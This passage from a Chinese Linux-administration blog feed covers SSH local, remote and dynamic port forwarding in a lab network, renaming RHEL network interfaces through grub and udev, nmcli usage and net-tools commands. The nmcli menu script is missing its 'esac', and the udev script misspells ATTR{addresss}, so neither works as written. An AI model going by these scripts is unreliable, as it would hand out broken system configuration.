echo@192.168.73.30</code></pre><blockquote><p>&#x628A;&#x672C;&#x5730;&#x7684;&#x67D0;&#x4E2A;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x5230;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF1A;</p></blockquote><p><strong>Nginx&#x670D;&#x52A1;&#x5668;</strong><br>.png</p><p><strong>&#x5BA2;&#x6237;&#x7AEF;</strong><br>.png</p><p>ssh -f -N -L 192.168.73.10:80:192.168.73.30:80 <a href="mailto:echo@192.168.73.30" target="_blank" rel="noopener">echo@192.168.73.30</a></p><p>.png<br>.png</p><h3 id="&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;"><a href="#&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;" class="headerlink" title="&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;"></a>&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;</h3><blockquote><p>&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;&#x662F;&#x901A;&#x8FC7;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x95F4;&#x5185;&#x7F51;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x516C;&#x7F51;&#x7AEF;&#x53E3;&#x4E0A;<br>&#x4F7F;&#x7528;&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;&#x9700;&#x8981;&#x5148;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br>&#x5141;&#x8BB8;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x548C;&#x5141;&#x8BB8;&#x7AEF;&#x53E3;&#x7ED1;&#x5B9A;</p></blockquote><pre><code>vim /etc/ssh/sshd_configAllowTcpForwarding yesGatewayPorts yes</code></pre><h4 id="&#x4F8B;&#x5B50;&#xFF1A;"><a href="#&#x4F8B;&#x5B50;&#xFF1A;" class="headerlink" title="&#x4F8B;&#x5B50;&#xFF1A;"></a><strong>&#x4F8B;&#x5B50;&#xFF1A;</strong></h4><p>CentOS 7&#xFF1A;192.168.110.20<br>RHEL 7: 192.168.73.10<br>Ubuntu 18.04(Nginx Server): 192.168.73.30</p><hr><p>Ubuntu:<br>&#x5C06;&#x672C;&#x5730;80&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;rhel 7&#x4E0A;</p><pre><code>ssh -R 0.0.0.0:80:localhost:80 root@192.168.73.10</code></pre><p>rhel 7:<br>&#x5C06;&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;CentOS 7&#x4E0A;</p><pre><code>ssh -R 0.0.0.0:80:localhost:80 root@192.168.110.20</code></pre><h3 id="&#x52A8;&#x6001;&#x8F6C;&#x53D1;"><a href="#&#x52A8;&#x6001;&#x8F6C;&#x53D1;" class="headerlink" title="&#x52A8;&#x6001;&#x8F6C;&#x53D1;"></a>&#x52A8;&#x6001;&#x8F6C;&#x53D1;</h3><p>ssh -D [&#x672C;&#x5730;&#x5730;&#x5740;]:&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x53F7; &#x8FDC;&#x7A0B;&#x7528;&#x6237;@&#x8FDC;&#x7A0B;&#x5730;&#x5740;</p><p><strong>&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x7EF4;&#x6301;</strong><br>&#x52A8;&#x6001;&#x8F6C;&#x53D1; ssh -D 1080 user@server1_ip<br>&#x7EF4;&#x6301;&#x94FE;&#x63A5; ssh -o ServerAliveInterval=time user@ip</p><p><strong>&#x6587;&#x6863;</strong><a href="https://www.ssh.com/academy/ssh/tunneling/example" target="_blank" rel="noopener">https://www.ssh.com/academy/ssh/tunneling/example</a></p><h2 id="&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;"><a href="#&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;" class="headerlink" title="&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;"></a>&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;</h2><h2 id="&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53C2;&#x6570;&#x89E3;&#x91CA;"><a href="#&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53C2;&#x6570;&#x89E3;&#x91CA;" class="headerlink" title="&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53C2;&#x6570;&#x89E3;&#x91CA;"></a>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53C2;&#x6570;&#x89E3;&#x91CA;</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SSH&amp;#x539F;&amp;#x7406;&quot;&gt;&lt;a href=&quot;#SSH&amp;#x539F;&amp;#x7406;&quot; class=&quot;headerlink&quot; title=&quot;SSH&amp;#x539F;&amp;#x7406;&quot;&gt;&lt;/a&gt;SSH&amp;#x539F;&amp;#x7406;&lt;/h2&gt;&lt;h2 i
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>rhel修改网卡命名规则</title>
    <link href="https://marnm.github.io//posts/bae5d4f0/"/>
    <id>https://marnm.github.io//posts/bae5d4f0/</id>
    <published>2022-06-07T04:41:31.000Z</published>
    <updated>2022-06-07T05:19:24.674Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;"><a href="#&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;" class="headerlink" title="&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;"></a>&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/sysconfig/network-scripts/ifcfg-ens33 /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0</span><br></pre></td></tr></tbody></table></figure><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">TYPE</span>=Ethernet</span><br><span class="line">....</span><br><span class="line"><span class="attr">NAME</span>=eth0</span><br><span class="line"><span class="attr">DEVICE</span>=eth0</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219;"><a href="#&#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219;" class="headerlink" title="&#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219;"></a>&#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219;</h2><blockquote><p>&#x6B64;&#x529F;&#x80FD;&#x901A;&#x8FC7;<code>/etc/default/grub</code>&#x6587;&#x4EF6;&#x6765;&#x63A7;&#x5236;&#xFF0C;&#x8981;&#x7981;&#x7528;&#x6B64;&#x529F;&#x80FD;&#xFF0C;&#x5728;&#x6587;&#x4EF6;&#x4E2D;GRUB_CMDLINE_LINUX&#x884C;&#x7684;&#x672B;&#x5C3E;&#x52A0;&#x5165;<code>net.ifnames=0  biosdevname=0</code>&#x5373;&#x53EF;</p></blockquote><pre><code>[root@ctos74 ~]$ cat /etc/default/grub</code></pre><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">GRUB_TIMEOUT</span>=<span class="number">5</span></span><br><span class="line"><span class="attr">GRUB_DISTRIBUTOR</span>=<span class="string">&quot;$(sed &apos;s, release .*$,,g&apos; /etc/system-release)&quot;</span></span><br><span class="line"><span class="attr">GRUB_DEFAULT</span>=saved</span><br><span class="line"><span class="attr">GRUB_DISABLE_SUBMENU</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">GRUB_TERMINAL_OUTPUT</span>=<span class="string">&quot;console&quot;</span></span><br><span class="line"><span class="attr">GRUB_CMDLINE_LINUX</span>=<span class="string">&quot;rd.lvm.lv=centos/root rd.lvm.lv=centos/swap rhgb quiet&quot;</span></span><br><span class="line"><span class="attr">GRUB_DISABLE_RECOVERY</span>=<span class="string">&quot;true&quot;</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &apos;s/swap rhgb quiet/&amp; net.ifnames=0 biosdevname=0/&apos; /etc/default/grub</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;"><a href="#&#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;" class="headerlink" title="&#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;"></a>&#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;</h2><p>rhel7&#x4E2D;&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x5230;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<code>70-persistent-ipoib.rules</code>&#x4E2D;<br>CentOS&#x76F4;&#x63A5;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;<code>70-persistent-net.rules</code>&#x6587;&#x4EF6;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSYSTEM==&quot;net&quot;,ACTION==&quot;add&quot;,DRIVERS==&quot;?*&quot;,ATTR{address}==&quot;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x540D;&#x79F0;&#x7684;&#x7F51;&#x5361;MAC&#x5730;&#x5740;&quot;,ATTR&#xFF5B;type&#xFF5D;==&quot;1&quot; ,KERNEL==&quot;eth*&quot;,NAME=&quot;eth0&quot;</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x66F4;&#x65B0;grub&#x914D;&#x7F6E;"><a href="#&#x66F4;&#x65B0;grub&#x914D;&#x7F6E;" class="headerlink" title="&#x66F4;&#x65B0;grub&#x914D;&#x7F6E;"></a>&#x66F4;&#x65B0;grub&#x914D;&#x7F6E;</h2><pre><code>grub2-mkconfig -o /boot/grub2/grub.cfg</code></pre><hr><h2 id="&#x6269;&#x5C55;&#xFF1A;-shell&#x811A;&#x672C;&#x5B9E;&#x73B0;&#x4EE5;&#x4E0A;&#x5168;&#x90E8;&#x64CD;&#x4F5C;"><a href="#&#x6269;&#x5C55;&#xFF1A;-shell&#x811A;&#x672C;&#x5B9E;&#x73B0;&#x4EE5;&#x4E0A;&#x5168;&#x90E8;&#x64CD;&#x4F5C;" class="headerlink" title="&#x6269;&#x5C55;&#xFF1A; shell&#x811A;&#x672C;&#x5B9E;&#x73B0;&#x4EE5;&#x4E0A;&#x5168;&#x90E8;&#x64CD;&#x4F5C;"></a>&#x6269;&#x5C55;&#xFF1A; shell&#x811A;&#x672C;&#x5B9E;&#x73B0;&#x4EE5;&#x4E0A;&#x5168;&#x90E8;&#x64CD;&#x4F5C;</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">NetInterfaceNameRules(){</span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;</span></span><br><span class="line">cp /etc/sysconfig/network-scripts/ifcfg-ens33 /etc/sysconfig/network-scripts/backupens33</span><br><span class="line">echo -e &quot;\e[1;32m&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5907;&#x4EFD;&#x5728;/etc/sysconfig/network-scripts/backupens33\e[0m&quot;</span><br><span class="line">/usr/bin/sed -i &apos;s/NAME=ens33/NAME=eth0/g&apos; /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">/usr/bin/sed -i &apos;s/DEVICE=ens33/DEVICE=eth0/g&apos; /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219;</span></span><br><span class="line">cp /etc/default/grub /etc/default/backupgrub</span><br><span class="line">echo -e &quot;\e[1;32m&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#xFF1A;backupgrub\e[0m&quot;</span><br><span class="line">/usr/bin/sed -i &apos;s/swap rhgb quiet/&amp; net.ifnames=0 biosdevname=0/&apos; /etc/default/grub</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;</span></span><br><span class="line">MAC_ADDR=`ip link show dev ens33 | awk &apos;END{ print $NR }&apos;`</span><br><span class="line">if [ -f /etc/udev/rules.d/70-persistent-ipoib.rules ]</span><br><span class="line">then</span><br><span class="line">    /usr/bin/sed -i &apos;$a SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, DRIVERS==&quot;?*&quot;, ATTR{addresss}==&apos;\&quot;&quot;$MAC_ADDR&quot;\&quot;&apos;,ATTR{type}==&quot;1&quot;,KERNEL==&quot;eth*&quot;,NAME=&quot;eth0&quot;&apos; /etc/udev/rules.d/70-persistent-*</span><br><span class="line">else</span><br><span class="line">    /usr/bin/echo &apos;SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, DRIVERS==&quot;?*&quot;, ATTR{addresss}==&apos;\&quot;&quot;$MAC_ADDR&quot;\&quot;&apos;,ATTR{type}==&quot;1&quot;,KERNEL==&quot;eth*&quot;,NAME=&quot;eth0&quot;&apos; &gt;&gt; /etc/udev/rules.d/70-persistent-net.rules</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">sudo /usr/sbin/grub2-mkconfig -o /boot/grub2/grub.cfg</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">NetInterfaceNameRules</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x4FEE;&amp;#x6539;&amp;#x7F51;&amp;#x5361;&amp;#x540D;&amp;#x79F0;&quot;&gt;&lt;a href=&quot;#&amp;#x4FEE;&amp;#x6539;&amp;#x7F51;&amp;#x5361;&amp;#x540D;&amp;#x79F0;&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>NetworkManager管理工具</title>
    <link href="https://marnm.github.io//posts/1876d05d/"/>
    <id>https://marnm.github.io//posts/1876d05d/</id>
    <published>2022-06-07T04:41:12.000Z</published>
    <updated>2022-06-07T05:19:51.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NetworkManager-&#x7F51;&#x7EDC;&#x7BA1;&#x7406;&#x5DE5;&#x5177;"><a href="#NetworkManager-&#x7F51;&#x7EDC;&#x7BA1;&#x7406;&#x5DE5;&#x5177;" class="headerlink" title="NetworkManager &#x7F51;&#x7EDC;&#x7BA1;&#x7406;&#x5DE5;&#x5177;"></a>NetworkManager &#x7F51;&#x7EDC;&#x7BA1;&#x7406;&#x5DE5;&#x5177;</h1><p>NetworkManager&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>networkmanager</code>&#x5305;&#x5B89;&#x88C5;&#xFF0C;&#x5B89;&#x88C5;&#x540E;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;daemon&#x3001;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x884C;&#x754C;&#x9762;<code>nmcli</code>&#x548C;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;curses&#x7684;&#x754C;&#x9762;<code>nmtui</code>&#x3002;</p><p><strong>&#x542F;&#x7528;&#x4E0E;&#x5173;&#x95ED;</strong></p><p>&#x901A;&#x8FC7;<code>NetworkManager.service</code>systemd&#x670D;&#x52A1;&#x542F;&#x52A8;&#x4E0E;&#x5173;&#x95ED;</p><h3 id="&#x8BED;&#x6CD5;"><a href="#&#x8BED;&#x6CD5;" class="headerlink" title="&#x8BED;&#x6CD5;"></a>&#x8BED;&#x6CD5;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli [OPTIONS] OBJECT { COMMAND | help }</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x9009;&#x9879;"><a href="#&#x9009;&#x9879;" class="headerlink" title="&#x9009;&#x9879;"></a>&#x9009;&#x9879;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS</span><br><span class="line">  -t[erse]                                  # terse output &#x7B80;&#x6D01;&#x7684;&#x8F93;&#x51FA;</span><br><span class="line">  -p[retty]                                 # pretty output &#x6F02;&#x4EAE;&#x7684;&#x8F93;&#x51FA;</span><br><span class="line">  -m[ode] tabular|multiline                 # output mode  &#x8F93;&#x51FA;&#x6A21;&#x5F0F;</span><br><span class="line">  -f[ields] &lt;field1,field2,...&gt;|all|common  # specify fields to output &#x6307;&#x5B9A;&#x8981;&#x8F93;&#x51FA;&#x7684;&#x5B57;&#x6BB5;</span><br><span class="line">  -e[scape] yes|no                          # escape columns separators in values &#x5728;&#x503C;&#x4E2D;&#x8F6C;&#x4E49;&#x5217;&#x5206;&#x9694;&#x7B26;</span><br><span class="line">  -n[ocheck]                                # &#x4E0D;&#x8981;&#x68C0;&#x67E5;nmcli&#x548C;NetworkManager&#x7248;&#x672C;</span><br><span class="line">  -a[sk]                                    # &#x8981;&#x6C42;&#x7F3A;&#x5C11;&#x53C2;&#x6570;</span><br><span class="line">  -w[ait] &lt;seconds&gt;                         # &#x8BBE;&#x7F6E;&#x8D85;&#x65F6;&#x7B49;&#x5F85;&#x6574;&#x7406;&#x64CD;&#x4F5C;</span><br><span class="line">  -v[ersion]                                # &#x663E;&#x793A;&#x7A0B;&#x5E8F;&#x7248;&#x672C;</span><br><span class="line">  -h[elp]                                   # &#x6253;&#x5370;&#x6B64;&#x5E2E;&#x52A9;</span><br><span class="line"></span><br><span class="line">OBJECT</span><br><span class="line">  g[eneral]       NetworkManager&#x7684;&#x4E00;&#x822C;&#x72B6;&#x6001;&#x548C;&#x64CD;&#x4F5C;</span><br><span class="line">  n[etworking]    &#x6574;&#x4F53;&#x7EC4;&#x7F51;&#x63A7;&#x5236;</span><br><span class="line">  r[adio]         NetworkManager&#x5207;&#x6362;&#x5F00;&#x5173;</span><br><span class="line">  c[onnection]    NetworkManager&#x7684;&#x8FDE;&#x63A5;</span><br><span class="line">  d[evice]        &#x7531;NetworkManager&#x7BA1;&#x7406;&#x7684;&#x8BBE;&#x5907;</span><br><span class="line">  a[gent]         NetworkManager&#x79D8;&#x5BC6;&#x4EE3;&#x7406;&#x6216;polkit&#x4EE3;&#x7406;</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x5B9E;&#x4F8B;"><a href="#&#x5B9E;&#x4F8B;" class="headerlink" title="&#x5B9E;&#x4F8B;"></a>&#x5B9E;&#x4F8B;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmcli connection show            # &#x67E5;&#x770B;&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x72B6;&#x6001;</span><br><span class="line">nmcli connection reload          # &#x91CD;&#x542F;&#x670D;&#x52A1;</span><br><span class="line">nmcli connection show -active    # &#x663E;&#x793A;&#x6D3B;&#x52A8;&#x7684;&#x8FDE;&#x63A5;</span><br><span class="line">nmcli connection show &quot;lan eth0&quot; # &#x663E;&#x793A;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x914D;&#x7F6E;</span><br><span class="line">nmcli device status              # &#x663E;&#x793A;&#x8BBE;&#x5907;&#x72B6;&#x6001;</span><br><span class="line">nmcli device show eno16777736    # &#x663E;&#x793A;&#x6307;&#x5B9A;&#x63A5;&#x53E3;&#x5C5E;&#x6027;</span><br><span class="line">nmcli device show                # &#x663E;&#x793A;&#x5168;&#x90E8;&#x63A5;&#x53E3;&#x5C5E;&#x6027;</span><br><span class="line">nmcli con up static              # &#x542F;&#x7528;static&#x8FDE;&#x63A5;&#x914D;&#x7F6E;</span><br><span class="line">nmcli con up default             # &#x542F;&#x7528;default&#x8FDE;&#x63A5;&#x914D;&#x7F6E; </span><br><span class="line">nmcli con add help               # &#x67E5;&#x770B;&#x5E2E;&#x52A9;</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x521B;&#x5EFA;&#x7F51;&#x7EDC;&#x4F1A;&#x8BDD;"><a href="#&#x521B;&#x5EFA;&#x7F51;&#x7EDC;&#x4F1A;&#x8BDD;" class="headerlink" title="&#x521B;&#x5EFA;&#x7F51;&#x7EDC;&#x4F1A;&#x8BDD;"></a>&#x521B;&#x5EFA;&#x7F51;&#x7EDC;&#x4F1A;&#x8BDD;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmcli connection add con-name company ifname ens33 autoconnect no type ethernet ip4 192.168.1.2/24 gw4 192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> con-name &#x6307;&#x5B9A;&#x4F1A;&#x8BDD;&#x540D;&#x79F0;&#xFF0C;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ifname &#x6307;&#x5B9A;&#x672C;&#x673A;&#x7F51;&#x5361;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> autoconnect no/yes &#x662F;&#x5426;&#x81EA;&#x52A8;&#x8FDE;&#x63A5;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">type</span> &#x6307;&#x5B9A;&#x7F51;&#x5361;&#x7C7B;&#x578B;ethernet</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ip4/ip6</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> gw4/gw6</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> nmcli</span></span><br><span class="line">echo &quot;NetworkManager&#x7BA1;&#x7406;&#x811A;&#x672C;&quot;</span><br><span class="line">echo -e &quot;1.&#x67E5;&#x770B;&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x72B6;&#x6001;\n2.&#x91CD;&#x542F;&#x670D;&#x52A1;\n3.&#x663E;&#x793A;&#x6D3B;&#x52A8;&#x7684;&#x8FDE;&#x63A5;\n&quot;</span><br><span class="line"></span><br><span class="line">function net_stat(){</span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x67E5;&#x770B;&#x5168;&#x90E8;&#x72B6;&#x6001;</span></span><br><span class="line">nmcli connection show</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x67E5;&#x770B;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;</span></span><br><span class="line">nmcli connection show $0</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">read -p &quot;&#x8BF7;&#x9009;&#x62E9;&#x60A8;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;&quot; info</span><br><span class="line">case $info in</span><br><span class="line">1) nmcli connection show </span><br><span class="line">;;</span><br><span class="line">*) echo -e &quot;\e[1;31mError! &#x683C;&#x5F0F;&#x9519;&#x8BEF;&#xFF01;\e[0m&quot;</span><br><span class="line">done</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;NetworkManager-&amp;#x7F51;&amp;#x7EDC;&amp;#x7BA1;&amp;#x7406;&amp;#x5DE5;&amp;#x5177;&quot;&gt;&lt;a href=&quot;#NetworkManager-&amp;#x7F51;&amp;#x7EDC;&amp;#x7BA1;&amp;#x7406;&amp;#x5DE5;&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>net-tools工具</title>
    <link href="https://marnm.github.io//posts/1939d3e2/"/>
    <id>https://marnm.github.io//posts/1939d3e2/</id>
    <published>2022-06-07T04:40:59.000Z</published>
    <updated>2022-06-07T05:20:03.867Z</updated>
    
    <content type="html"><![CDATA[<h1 id="net-tools&#x5DE5;&#x5177;&#x5305;"><a href="#net-tools&#x5DE5;&#x5177;&#x5305;" class="headerlink" title="net-tools&#x5DE5;&#x5177;&#x5305;"></a>net-tools&#x5DE5;&#x5177;&#x5305;</h1><table><thead><tr><th>net-tools</th><th>iproute2</th></tr></thead><tbody><tr><td>arp -na</td><td>ip neigh</td></tr><tr><td>ifconfig</td><td>ip link</td></tr><tr><td>ifconfig -a</td><td>ip addr show</td></tr><tr><td>ifconfig &#x2013;help</td><td>ip help</td></tr><tr><td>ifconfig -eth0 up</td><td>ip link set eth0 up</td></tr><tr><td>ipmaddr</td><td>ip maddr</td></tr><tr><td>iptunnel</td><td>ip tunnel</td></tr><tr><td>netstat</td><td>ss</td></tr><tr><td>netstat -i</td><td>ip -s link</td></tr><tr><td>netstat -g</td><td>ip maddr</td></tr><tr><td>netstat -l</td><td>ss -l</td></tr><tr><td>netstat -r</td><td>ip route</td></tr><tr><td>route add</td><td>ip route add</td></tr><tr><td>route del</td><td>ip route del</td></tr><tr><td>route -n</td><td>ip route show</td></tr><tr><td>vconfig</td><td>ip link</td></tr></tbody></table><h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><p><code>eth0</code>&#x3001;<code>eth0:1</code>&#x3001;<code>eth0.1</code>&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;&#xFF1A;<br><strong>&#x4E09;&#x8005;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;&#x5BF9;&#x5E94;&#x4E8E;&#x7269;&#x7406;&#x7F51;&#x5361;&#x3001;&#x5B50;&#x7F51;&#x5361;&#x3001;&#x865A;&#x62DF;VLAN&#x7F51;&#x5361;</strong>  </p><ul><li><strong>&#x7269;&#x7406;&#x7F51;&#x5361;</strong> 